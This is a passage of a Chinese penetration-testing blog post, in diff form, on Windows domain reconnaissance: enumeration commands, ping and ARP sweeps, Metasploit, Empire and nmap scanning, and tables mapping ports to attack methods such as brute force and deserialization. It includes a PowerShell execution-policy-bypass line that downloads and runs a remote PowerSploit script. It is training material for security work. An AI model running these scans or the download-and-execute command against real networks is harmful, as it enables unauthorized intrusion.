REG_DWORD &#x2F;d 0 &#x2F;f</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-自动收集信息"><a href="#1-2-自动收集信息" class="headerlink" title="1.2 自动收集信息"></a>1.2 自动收集信息</h3><p>WMIC（Windows管理工具命令行）。在默认情况下，任何版本的Windows XP的低权限用户不能访问WMIC，Windows 7以上版本的低权限用户允许访问WMIC并执行相关查询操作。</p>
+<p>下载地址：<a href="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar" target="_blank" rel="noopener">http://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p>
+<p>执行完脚本后，会将所有结果写入一个HTML文件中。</p>
+<h3 id="1-3-Empire下的主机信息收集"><a href="#1-3-Empire下的主机信息收集" class="headerlink" title="1.3 Empire下的主机信息收集"></a>1.3 Empire下的主机信息收集</h3><p>Empire提供了用于收集主机信息的模块。输入命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">usemodule situational_awareness&#x2F;host&#x2F;winenum</span><br></pre></td></tr></table></figure>
+
+<p>empire下载地址：<a href="https://github.com/EmpireProject/Empire.git" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire.git</a></p>
+<h2 id="2-查询当前权限"><a href="#2-查询当前权限" class="headerlink" title="2 查询当前权限"></a>2 查询当前权限</h2><h3 id="2-1-查看当前权限"><a href="#2-1-查看当前权限" class="headerlink" title="2.1 查看当前权限"></a>2.1 查看当前权限</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure>
+
+<p>共有以下三种情况：</p>
+<ul>
+<li>本地普通用户：只能查询本机相关信息，不能查询域内信息。</li>
+<li>本地管理员用户：可以查询域内信息。</li>
+<li>域内用户：可以查询域内信息。</li>
+</ul>
+<h3 id="2-2-获取域SID"><a href="#2-2-获取域SID" class="headerlink" title="2.2 获取域SID"></a>2.2 获取域SID</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami &#x2F;all</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20220414/16499052474791.png" alt="image-20220328093054291"></p>
+<ul>
+<li>当前域hacke的SID为S-1-5-21-1876960018-2564456387</li>
+<li>域用户user1的SID为S-1-5-21-1876960018-2564456387-1273048475-1105</li>
+</ul>
+<h3 id="2-3-查询指定用户的详细信息"><a href="#2-3-查询指定用户的详细信息" class="headerlink" title="2.3 查询指定用户的详细信息"></a>2.3 查询指定用户的详细信息</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user xxx &#x2F;domain</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-判断是否存在域"><a href="#3-判断是否存在域" class="headerlink" title="3 判断是否存在域"></a>3 判断是否存在域</h2><h3 id="3-1-ipconfig命令"><a href="#3-1-ipconfig命令" class="headerlink" title="3.1 ipconfig命令"></a>3.1 ipconfig命令</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ipconfig &#x2F;all</span><br></pre></td></tr></table></figure>
+
+<p>在使用反向解析查询命令nslookup来解析IP地址。用解析得到的进行对比，判断域控制器和DNS服务器是否在同一台服务器上。</p>
+<h3 id="3-2-查看系统详细信息"><a href="#3-2-查看系统详细信息" class="headerlink" title="3.2 查看系统详细信息"></a>3.2 查看系统详细信息</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-3-查询当前登录域及登录用户信息"><a href="#3-3-查询当前登录域及登录用户信息" class="headerlink" title="3.3 查询当前登录域及登录用户信息"></a>3.3 查询当前登录域及登录用户信息</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-4-判断主域"><a href="#3-4-判断主域" class="headerlink" title="3.4 判断主域"></a>3.4 判断主域</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net time &#x2F;domain</span><br></pre></td></tr></table></figure>
+
+<p>存在以下三种情况：</p>
+<ul>
+<li>存在域，但当前用户不是域用户。命令会执行失败。</li>
+<li>存在域，且当前用户是域用户。</li>
+<li>当前网络环境为工作组，不存在域。</li>
+</ul>
+<h2 id="4-探测域内存活主机"><a href="#4-探测域内存活主机" class="headerlink" title="4 探测域内存活主机"></a>4 探测域内存活主机</h2><h3 id="4-1-利用NetBIOS快速探测内网"><a href="#4-1-利用NetBIOS快速探测内网" class="headerlink" title="4.1 利用NetBIOS快速探测内网"></a>4.1 利用NetBIOS快速探测内网</h3><p>NetBIOS，为网上基本输入输出系统（英语：Network Basic Input/Output System）的缩写，它提供了OSI模型中的会话层服务，让在不同计算机上运行的不同程序，可以在局域网中，互相连线，以及分享数据。严格来说，NetBIOS不是一种网上协议，而是应用程序接口（API）。</p>
+<p>可扫描本地或远程TCP / IP网络上的打开的NETBIOS名称服务器，但只能用于局域网。<br>官网链接：<a href="http://www.unixwiz.net/tools/nbtscan.html" target="_blank" rel="noopener">http://www.unixwiz.net/tools/nbtscan.html</a></p>
+<p>参数说明：</p>
+<table>
+<thead>
+<tr>
+<th align="left">Token</th>
+<th align="left">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">SHARING</td>
+<td align="left">机器正在运行的文件和打印共享服务，但这并不一定有内容共享</td>
+</tr>
+<tr>
+<td align="left">DC</td>
+<td align="left">机器可能是Windows NT域控制器，无论是主域还是辅助域。</td>
+</tr>
+<tr>
+<td align="left">U=user</td>
+<td align="left">机器可能有一个具有指定名称的登录用户</td>
+</tr>
+<tr>
+<td align="left">IIS</td>
+<td align="left">机器可能安装了Microsoft的Internet信息服务器（IIS）</td>
+</tr>
+<tr>
+<td align="left">EXCHANGE</td>
+<td align="left">机器可能安装Microsoft Exchange</td>
+</tr>
+<tr>
+<td align="left">NOTES</td>
+<td align="left">单机器可能安装Lotus Notes电子邮件客户端</td>
+</tr>
+<tr>
+<td align="left">?</td>
+<td align="left">没有识别出NETBIOS资源</td>
+</tr>
+</tbody></table>
+<h3 id="4-2-利用ICMP协议快速探测内网"><a href="#4-2-利用ICMP协议快速探测内网" class="headerlink" title="4.2 利用ICMP协议快速探测内网"></a>4.2 <strong>利用ICMP协议快速探测内网</strong></h3><p>ICMP（Internet Control Message Protocol）Internet控制报文协议。它是TCP/IP协议簇的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。</p>
+<p>使用ICMP协议：</p>
+<p>命 令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 192.168.1.%I | findstr &quot;TTL&quot;</span><br></pre></td></tr></table></figure>
+
+<p>解释：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%i in (1,1,254)    遍历主机位从1 ~254的所有IP</span><br><span class="line">-n    ping的次数</span><br><span class="line">-w    等待每次回复的时长（毫秒）</span><br><span class="line">192.168.0.%i    遍历IP 自192.168.0.1~192.168.0.254的所有IP</span><br><span class="line">| bat    管道，将前面的结果通过管道输入给后面的命令</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-3-使用ARP扫描探测内网"><a href="#4-3-使用ARP扫描探测内网" class="headerlink" title="4.3 使用ARP扫描探测内网"></a>4.3 <strong>使用ARP扫描探测内网</strong></h3><p>地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP/IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。</p>
+<p>命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">arp -a</span><br><span class="line">arp.exe -t 192.168.1.0&#x2F;20</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-扫描域内端口"><a href="#5-扫描域内端口" class="headerlink" title="5 扫描域内端口"></a>5 扫描域内端口</h2><p>通过端口扫描主要用于得到端口的banner信息、端口上运行的服务、发现常见应用的默认端口。</p>
+<h3 id="5-1-利用telnet进行端口扫描"><a href="#5-1-利用telnet进行端口扫描" class="headerlink" title="5.1 利用telnet进行端口扫描"></a>5.1 利用telnet进行端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">telnet 192.168.0.2 22</span><br><span class="line">telnet 192.168.0.2 3306</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-2-Metasploit端口扫描"><a href="#5-2-Metasploit端口扫描" class="headerlink" title="5.2 Metasploit端口扫描"></a>5.2 Metasploit端口扫描</h3><p>Metasploit渗透测试利器，提供了很多漏洞利用、扫描功能。</p>
+<p>auxiliary/scanner/portscan/ack    ACK防火墙扫描<br>auxiliary/scanner/portscan/ftpbounce FTP跳端口扫描<br>auxiliary/scanner/portscan/syn    SYN端口扫描<br>auxiliary/scanner/portscan/tcp    TCP端口扫描<br>auxiliary/scanner/portscan/xmas    TCP”XMas”端口扫描</p>
+<p>使用auxiliary/scanner/portscan/tcp模块示例</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp</span><br><span class="line">show options</span><br><span class="line">set ports 1-1024</span><br><span class="line">set RHOSTS 192.168.0.1</span><br><span class="line">set THREADS 10</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-3-PowerSploit的Invoke-portscan-ps1"><a href="#5-3-PowerSploit的Invoke-portscan-ps1" class="headerlink" title="5.3 PowerSploit的Invoke-portscan.ps1"></a>5.3 PowerSploit的Invoke-portscan.ps1</h3><p>无文件形式扫描：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Recon&#x2F;Invoke-Portscan.ps1&#39;);Invoke-Portscan -Hosts 192.168.1.0&#x2F;24 -T 4 -ports &#39;445,1433,80,8080,3389&#39; -oA c:\ProgramData\ip_info&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-4-Nishang的Invoke-PortScan模块"><a href="#5-4-Nishang的Invoke-PortScan模块" class="headerlink" title="5.4 Nishang的Invoke-PortScan模块"></a>5.4 Nishang的Invoke-PortScan模块</h3><p>获取帮助</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-Help Invoke-PortScan -full</span><br></pre></td></tr></table></figure>
+
+<p>详细代码：<a href="https://github.com/samratashok/nishang/blob/master/Scan/Invoke-PortScan.ps1" target="_blank" rel="noopener">https://github.com/samratashok/nishang/blob/master/Scan/Invoke-PortScan.ps1</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">StartAddress 扫描范围开始地址 </span><br><span class="line">EndAddress 扫描范围结束地址</span><br><span class="line">ScanPort 进行端口扫描</span><br><span class="line">Port 指定扫描端口，不指定port，则默认端口为21,22,23,53,69,71,80,98,110,139,111,389,443,445,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389, 5801,5900,5555,5901</span><br><span class="line">TimeOut 设置超时时间</span><br><span class="line">-ResolveHost 解析主机名</span><br></pre></td></tr></table></figure>
+
+<p>扫描存活主机及端口并解析主机名</p>
+<p>使用方式</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Invoke-PortScan -StartAddress 192.168.0.1 -EndAddress 192.168.10.254 -ResolveHost -ScanPort</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-5-Nmap"><a href="#5-5-Nmap" class="headerlink" title="5.5 Nmap"></a>5.5 Nmap</h3><h4 id="参数速查表"><a href="#参数速查表" class="headerlink" title="参数速查表"></a>参数速查表</h4><table>
+<thead>
+<tr>
+<th>参数(注意区分大小写)</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-sT</td>
+<td>TCP connect()扫描，这种方式会在目标主机的日志中记录大批连接请求和错误信息。</td>
+</tr>
+<tr>
+<td>-sS</td>
+<td>半开扫描，很少有系统能把它记入系统日志。不过，需要Root权限。</td>
+</tr>
+<tr>
+<td>-sF  -sN</td>
+<td>秘密FIN数据包扫描、Xmas Tree、Null扫描模式</td>
+</tr>
+<tr>
+<td>-sP</td>
+<td>ping扫描，Nmap在扫描端口时，默认都会使用ping扫描，只有主机存活，Nmap才会继续扫描。</td>
+</tr>
+<tr>
+<td>-sU</td>
+<td>UDP扫描，但UDP扫描是不可靠的</td>
+</tr>
+<tr>
+<td>-sA</td>
+<td>这项高级的扫描方法通常用来穿过防火墙的规则集</td>
+</tr>
+<tr>
+<td>-sV</td>
+<td>探测端口服务版本</td>
+</tr>
+<tr>
+<td>-Pn</td>
+<td>扫描之前不需要用ping命令，有些防火墙禁止ping命令。可以使用此选项进行扫描</td>
+</tr>
+<tr>
+<td>-v</td>
+<td>显示扫描过程，推荐使用</td>
+</tr>
+<tr>
+<td>-h</td>
+<td>帮助选项，是最清楚的帮助文档</td>
+</tr>
+<tr>
+<td>-p</td>
+<td>指定端口，如“1-65535、1433、135、22、80”等</td>
+</tr>
+<tr>
+<td>-O</td>
+<td>启用远程操作系统检测，存在误报</td>
+</tr>
+<tr>
+<td>-A</td>
+<td>全面系统检测、启用脚本检测、扫描等</td>
+</tr>
+<tr>
+<td>-oN/-oX/-oG</td>
+<td>将报告写入文件，分别是正常、XML、grepable 三种格式</td>
+</tr>
+<tr>
+<td>-T4</td>
+<td>针对TCP端口禁止动态扫描延迟超过10ms</td>
+</tr>
+<tr>
+<td>-iL</td>
+<td>读取主机列表，例如，“-iL C:\ip.txt”</td>
+</tr>
+</tbody></table>
+<h5 id="5-5-1-扫描单个目标"><a href="#5-5-1-扫描单个目标" class="headerlink" title="5.5.1 扫描单个目标"></a>5.5.1 扫描单个目标</h5><p>nmap ip</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如：nmap 192.168.0.101</span><br></pre></td></tr></table></figure>
+
+<h5 id="5-5-2-扫描多个目标"><a href="#5-5-2-扫描多个目标" class="headerlink" title="5.5.2 扫描多个目标"></a>5.5.2 扫描多个目标</h5><p>nmap ip1 ip2 适用于目标地址不再同一个网段或在同一网段不连续且数量不多的情况。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如：nmap 192.168.0.101 192.168.0.110</span><br></pre></td></tr></table></figure>
+
+<h5 id="5-5-3-扫描一个范围内的目标"><a href="#5-5-3-扫描一个范围内的目标" class="headerlink" title="5.5.3 扫描一个范围内的目标"></a>5.5.3 扫描一个范围内的目标</h5><p>nmap xxx.xxx.xxx.xxx-xxx</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如：nmap 192.168.0.100-110</span><br></pre></td></tr></table></figure>
+
+<h5 id="5-5-4-扫描目标地址所在某网段"><a href="#5-5-4-扫描目标地址所在某网段" class="headerlink" title="5.5.4 扫描目标地址所在某网段"></a>5.5.4 扫描目标地址所在某网段</h5><p>namp xxx.xxx.xxx.xxx/xx</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如：nmap 192.168.0.1&#x2F;24</span><br></pre></td></tr></table></figure>
+
+<h5 id="5-5-5-扫描包含主机列表的文件中的所有地址"><a href="#5-5-5-扫描包含主机列表的文件中的所有地址" class="headerlink" title="5.5.5 扫描包含主机列表的文件中的所有地址"></a>5.5.5 扫描包含主机列表的文件中的所有地址</h5><p>nmap -iL <File path></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如：nmap -iL &#x2F;root&#x2F;target.txt</span><br></pre></td></tr></table></figure>
+
+<h5 id="5-5-6-扫描除了一个目标地址之外的所有地址"><a href="#5-5-6-扫描除了一个目标地址之外的所有地址" class="headerlink" title="5.5.6 扫描除了一个目标地址之外的所有地址"></a>5.5.6 扫描除了一个目标地址之外的所有地址</h5><p>nmap ip段 -exclude 被排除的ip</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如：nmap 192.168.0.100-110 -exclude 192.168.0.103</span><br><span class="line">   nmap 192.168.0.1&#x2F;24 -exclude 192.168.0.103</span><br></pre></td></tr></table></figure>
+
+<h5 id="5-5-7-扫描除了某一个文件中的地址之外的所有地址"><a href="#5-5-7-扫描除了某一个文件中的地址之外的所有地址" class="headerlink" title="5.5.7 扫描除了某一个文件中的地址之外的所有地址"></a>5.5.7 扫描除了某一个文件中的地址之外的所有地址</h5><p>nmap ip段 -excludefile <file path></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如：nmap 192.168.0.100-110 -excludefile &#x2F;root&#x2F;targets.txt</span><br><span class="line">   nmap 192.168.0.1&#x2F;24 -excludefile &#x2F;root&#x2F;targets.txt</span><br></pre></td></tr></table></figure>
+
+<h5 id="5-5-8-扫描目标地址的指定端口"><a href="#5-5-8-扫描目标地址的指定端口" class="headerlink" title="5.5.8 扫描目标地址的指定端口"></a>5.5.8 扫描目标地址的指定端口</h5><p>nmap ip -p 端口1，端口2，端口3……</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如:nmap 192.168.0.101 -p 80,8080,3306,3389</span><br></pre></td></tr></table></figure>
+
+<h5 id="5-5-9-对目标地址进行路由跟踪"><a href="#5-5-9-对目标地址进行路由跟踪" class="headerlink" title="5.5.9 对目标地址进行路由跟踪"></a>5.5.9 对目标地址进行路由跟踪</h5><p>nmap –traceroute ip</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如：nmap --traceroute 192.168.0.101</span><br></pre></td></tr></table></figure>
+
+<h5 id="5-5-10-扫描目标地址C段的在线主机"><a href="#5-5-10-扫描目标地址C段的在线主机" class="headerlink" title="5.5.10 扫描目标地址C段的在线主机"></a>5.5.10 扫描目标地址C段的在线主机</h5><p>nmap -sP ip段</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如：nmap -sP 192.168.0.1&#x2F;24</span><br></pre></td></tr></table></figure>
+
+<h5 id="5-5-11-扫描目标地址操作系统版本进行探测"><a href="#5-5-11-扫描目标地址操作系统版本进行探测" class="headerlink" title="5.5.11 扫描目标地址操作系统版本进行探测"></a>5.5.11 扫描目标地址操作系统版本进行探测</h5><p>nmap -O ip</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如：nmap -O 192.168.0.101</span><br></pre></td></tr></table></figure>
+
+<h5 id="5-5-12-扫描目标所开放的全部端口（半开式）"><a href="#5-5-12-扫描目标所开放的全部端口（半开式）" class="headerlink" title="5.5.12 扫描目标所开放的全部端口（半开式）"></a>5.5.12 扫描目标所开放的全部端口（半开式）</h5><p>nmap -sS -p 端口号(多个用“,”隔开) -v ip</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如：nmap -sS -p 1-65535 192.168.0.101</span><br></pre></td></tr></table></figure>
+
+<h5 id="5-5-13-扫描目标地址开放服务-端口-版本"><a href="#5-5-13-扫描目标地址开放服务-端口-版本" class="headerlink" title="5.5.13 扫描目标地址开放服务(端口)版本"></a>5.5.13 扫描目标地址开放服务(端口)版本</h5><p>nmap -sV ip</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如：nmap -sV 192.168.0.101</span><br></pre></td></tr></table></figure>
+
+<h5 id="5-5-14-探测防火墙"><a href="#5-5-14-探测防火墙" class="headerlink" title="5.5.14 探测防火墙"></a>5.5.14 探测防火墙</h5><p>nmap -sF -T4 ip</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如：nmap -sF -T4 192.168.0.101</span><br></pre></td></tr></table></figure>
+
+<h5 id="5-5-15-绕过防火墙进行全面扫描"><a href="#5-5-15-绕过防火墙进行全面扫描" class="headerlink" title="5.5.15 绕过防火墙进行全面扫描"></a>5.5.15 绕过防火墙进行全面扫描</h5><p>nmap -Pn -A ip</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如：nmap -Pn -A 192.168.0.101</span><br></pre></td></tr></table></figure>
+
+<h4 id="进阶用法-advanced"><a href="#进阶用法-advanced" class="headerlink" title="进阶用法-advanced"></a>进阶用法-advanced</h4><p>nmap –script=xx 使用某个脚本进行扫描，<strong>这里只列出来部分脚本，更多脚本请看：<a href="https://nmap.org/nsedoc/（后续翻译后再更换链接）" target="_blank" rel="noopener">https://nmap.org/nsedoc/（后续翻译后再更换链接）</a></strong></p>
+<h5 id="1、弱口令扫描"><a href="#1、弱口令扫描" class="headerlink" title="1、弱口令扫描"></a>1、弱口令扫描</h5><p>nmap –script=auth ip 对某个主机或某网段主机的应用进行弱口令检测</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如：nmap --script&#x3D;auth 192.168.0.101</span><br></pre></td></tr></table></figure>
+
+<h5 id="2、暴力破解"><a href="#2、暴力破解" class="headerlink" title="2、暴力破解"></a>2、暴力破解</h5><p>nmap –script=brute ip 可以对数据库、MB、SNMP等进行简单的暴力破解</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如：nmap --script&#x3D;brute 192.168.0.101</span><br></pre></td></tr></table></figure>
+
+<h5 id="3、扫描常见漏洞"><a href="#3、扫描常见漏洞" class="headerlink" title="3、扫描常见漏洞"></a>3、扫描常见漏洞</h5><p>nmap –script=vuln ip </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如：nmap --script&#x3D;vuln 192.168.0.101</span><br></pre></td></tr></table></figure>
+
+<h5 id="4、使用脚本进行应用服务扫描"><a href="#4、使用脚本进行应用服务扫描" class="headerlink" title="4、使用脚本进行应用服务扫描"></a>4、使用脚本进行应用服务扫描</h5><p>nmap –script=xxx ip 对常见应用服务进行扫描 如：VNC、MySQL、Telnet、Rync等服务</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如VNC服务：nmap --script&#x3D;realvnc-auth-bypass 192.168.0.101</span><br></pre></td></tr></table></figure>
+
+<h5 id="5、探测局域网内服务开放情况"><a href="#5、探测局域网内服务开放情况" class="headerlink" title="5、探测局域网内服务开放情况"></a>5、探测局域网内服务开放情况</h5><p>nmap -n -p 端口号 –script=broadcast ip</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如：nmap -n -p 80,3306 --script&#x3D;broadcast 192.168.0.101</span><br></pre></td></tr></table></figure>
+
+<h5 id="6、Whois解析"><a href="#6、Whois解析" class="headerlink" title="6、Whois解析"></a>6、Whois解析</h5><p>nmap -script external url</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如：nmap -script external baidu.com</span><br></pre></td></tr></table></figure>
+
+<h5 id="7、扫描Web敏感目录"><a href="#7、扫描Web敏感目录" class="headerlink" title="7、扫描Web敏感目录"></a>7、扫描Web敏感目录</h5><p>nmap -p 80 –script=http-enum.nse ip</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -p 80 --script&#x3D;http-enum.nse 192.168.0.101</span><br></pre></td></tr></table></figure>
+
+<h5 id="8、其他"><a href="#8、其他" class="headerlink" title="8、其他"></a>8、其他</h5><p>上述所有命令的各种灵活组合使用。</p>
+<h3 id="5-6-端口Banner信息"><a href="#5-6-端口Banner信息" class="headerlink" title="5.6 端口Banner信息"></a>5.6 端口Banner信息</h3><h4 id="1、文件共享服务端口"><a href="#1、文件共享服务端口" class="headerlink" title="1、文件共享服务端口"></a>1、文件共享服务端口</h4><table>
+<thead>
+<tr>
+<th><strong>端口号</strong></th>
+<th><strong>端口说明</strong></th>
+<th><strong>利用方向</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>21/22/69</td>
+<td>FTP/TFTP文件传输协议</td>
+<td>允许匿名上传、下载、爆破和嗅探</td>
+</tr>
+<tr>
+<td>2049</td>
+<td>NFS服务</td>
+<td>配置不当</td>
+</tr>
+<tr>
+<td>139</td>
+<td>Samba服务</td>
+<td>爆破、未授权访问、远程代码执行</td>
+</tr>
+<tr>
+<td>389</td>
+<td>LDAP目录访问协议</td>
+<td>注入、允许匿名访问、弱口令</td>
+</tr>
+</tbody></table>
+<h4 id="2、远程连接服务端口"><a href="#2、远程连接服务端口" class="headerlink" title="2、远程连接服务端口"></a>2、远程连接服务端口</h4><table>
+<thead>
+<tr>
+<th><strong>端口号</strong></th>
+<th><strong>端口说明</strong></th>
+<th><strong>利用方向</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>22</td>
+<td>SSH远程连接</td>
+<td>爆破、SSH隧道及内网代理转发、文件传输</td>
+</tr>
+<tr>
+<td>23</td>
+<td>Telnet</td>
+<td>爆破、嗅探、弱口令</td>
+</tr>
+<tr>
+<td>3389</td>
+<td>RDP远程桌面连接</td>
+<td>Shift后门(Windows Server 2003以下版本)、爆破</td>
+</tr>
+<tr>
+<td>5900</td>
+<td>VNC</td>
+<td>弱口令爆破</td>
+</tr>
+<tr>
+<td>5632</td>
+<td>PyAnywhere服务</td>
+<td>抓密码、代码执行</td>
+</tr>
+</tbody></table>
+<h4 id="3、Web应用服务端口"><a href="#3、Web应用服务端口" class="headerlink" title="3、Web应用服务端口"></a>3、Web应用服务端口</h4><table>
+<thead>
+<tr>
+<th><strong>端口号</strong></th>
+<th><strong>端口说明</strong></th>
+<th><strong>利用方向</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>80/443/8080</td>
+<td>常见的Web服务端口</td>
+<td>Web攻击、爆破、对应服务器版本漏洞</td>
+</tr>
+<tr>
+<td>7001/70022</td>
+<td>WebLogic控制台</td>
+<td>Java反序列化、弱口令</td>
+</tr>
+<tr>
+<td>8080/8089</td>
+<td>Jboos/Resin/Jetty/Jenkins</td>
+<td>反序列化、控制台弱口令</td>
+</tr>
+<tr>
+<td>9090</td>
+<td>WebSphere控制台</td>
+<td>Java反序列化、弱口令</td>
+</tr>
+<tr>
+<td>4848</td>
+<td>GlassFish控制台</td>
+<td>弱口令</td>
+</tr>
+<tr>
+<td>1352</td>
+<td>Lotus dominio邮件服务</td>
+<td>弱口令、信息泄露、爆破</td>
+</tr>
+<tr>
+<td>10000</td>
+<td>Webmin-Web控制面板</td>
+<td>弱口令</td>
+</tr>
+</tbody></table>
+<h4 id="4、数据库服务端口"><a href="#4、数据库服务端口" class="headerlink" title="4、数据库服务端口"></a>4、数据库服务端口</h4><table>
+<thead>
+<tr>
+<th><strong>端口号</strong></th>
+<th><strong>端口说明</strong></th>
+<th><strong>利用方向</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>3306</td>
+<td>MySQL</td>
+<td>注入、提权、爆破</td>
+</tr>
+<tr>
+<td>1433</td>
+<td>MSSQL</td>
+<td>注入、提权、SAP弱口令、爆破</td>
+</tr>
+<tr>
+<td>1521</td>
+<td>Oracle</td>
+<td>TNS爆破、注入、反弹Shell</td>
+</tr>
+<tr>
+<td>5432</td>
+<td>PostgreSQL</td>
+<td>爆破、注入、弱口令</td>
+</tr>
+<tr>
+<td>27017/27018</td>
+<td>MongoDB</td>
+<td>爆破、未授权访问</td>
+</tr>
+<tr>
+<td>6379</td>
+<td>Redis</td>
+<td>可尝试未授权访问、弱口令爆破</td>
+</tr>
+<tr>
+<td>5000</td>
+<td>SysBase/DB2</td>
+<td>爆破、注入</td>
+</tr>
+</tbody></table>
+<h4 id="5、邮件服务端口"><a href="#5、邮件服务端口" class="headerlink" title="5、邮件服务端口"></a>5、邮件服务端口</h4><table>
+<thead>
+<tr>
+<th><strong>端口号</strong></th>
+<th><strong>端口说明</strong></th>
+<th><strong>利用方向</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>25</td>
+<td>SMTP邮件服务</td>
+<td>邮件伪造</td>
+</tr>
+<tr>
+<td>110</td>
+<td>POP3</td>
+<td>爆破、嗅探</td>
+</tr>
+<tr>
+<td>143</td>
+<td>IMAP</td>
+<td>爆破</td>
+</tr>
+</tbody></table>
+<h4 id="6、网络常见协议端口"><a href="#6、网络常见协议端口" class="headerlink" title="6、网络常见协议端口"></a>6、网络常见协议端口</h4><table>
+<thead>
+<tr>
+<th><strong>端口号</strong></th>
+<th><strong>端口说明</strong></th>
+<th><strong>利用方向</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>53</td>
+<td>DNS域名系统</td>
+<td>允许区域传送、DNS劫持、缓存投毒、欺骗</td>
+</tr>
+<tr>
+<td>67/68</td>
+<td>DHCP服务</td>
+<td>劫持、欺骗</td>
+</tr>
+<tr>
+<td>161</td>
+<td>SNMP协议</td>
+<td>爆破、搜集目标内网信息</td>
+</tr>
+</tbody></table>
+<h4 id="7、特殊服务端口"><a href="#7、特殊服务端口" class="headerlink" title="7、特殊服务端口"></a>7、特殊服务端口</h4><table>
+<thead>
+<tr>
+<th><strong>端口号</strong></th>
+<th><strong>端口说明</strong></th>
+<th><strong>利用方向</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>2181</td>
+<td>Zookeeper服务</td>
+<td>未授权访问</td>
+</tr>
+<tr>
+<td>8069</td>
+<td>Zabbix服务</td>
+<td>远程执行、SQL注入</td>
+</tr>
+<tr>
+<td>9200/9300</td>
+<td>Elasticsearch服务</td>
+<td>远程执行</td>
+</tr>
+<tr>
+<td>11211</td>
+<td>Memcache服务</td>
+<td>未授权访问</td>
+</tr>
+<tr>
+<td>512/513/514</td>
+<td>Linux Rexec服务</td>
+<td>爆破、Rlogin登录</td>
+</tr>
+<tr>
+<td>873</td>
+<td>Rsync服务</td>
+<td>匿名访问、文件上传</td>
+</tr>
+<tr>
+<td>3690</td>
+<td>Svn服务</td>
+<td>Svn泄露、未授权访问</td>
+</tr>
+<tr>
+<td>50000</td>
+<td>SAP Management Console</td>
+<td>远程执行</td>
+</tr>
